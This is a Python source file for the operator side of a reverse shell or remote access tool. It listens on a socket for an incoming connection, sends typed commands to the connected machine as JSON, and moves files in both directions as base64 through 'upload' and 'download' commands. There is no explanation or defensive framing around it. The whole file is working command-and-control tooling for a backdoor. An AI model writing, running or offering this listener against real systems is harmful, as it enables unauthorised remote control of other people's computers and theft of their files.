import socket
import simplejson
import base64

class Socket_listener():
	def __init__(self,ip,port):
		my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		my_listener.bind((f"{ip}",port))
		my_listener.listen(0)
		print("listening")
		(self.my_connection,my_address) = my_listener.accept()
		print("connection")
	def json_send(self,data):
		json_data = simplejson.dumps(data).encode("utf-8")
		self.my_connection.send(json_data)	
	
	def json_recv(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue
		
	def command_ex(self,command_input):
		self.json_send(command_input)
		if command_input[0] == "exit":
			self.my_connection.close()
			exit()
		
		return self.json_recv()
		
	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "download OK"
		
	def upload_file(self,path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())
		
		
	def sencommand(self):
		while True:
			command_input = input("enter command: ")
			command_input = command_input.split(" ")
			try:
				if command_input[0] == "upload":
					content = self.upload_file(command_input[1])
					command_input.append(content)
				
				command_output = self.command_ex(command_input)
				if command_input[0] == "download":
					command_output = self.save_file(command_input[1],command_output)
			except Exception:
				command_output = "Error !"
			
			print(command_output)

def Listening(ip,port):
	my_con = Socket_listener(ip,port)
	my_con.sencommand()
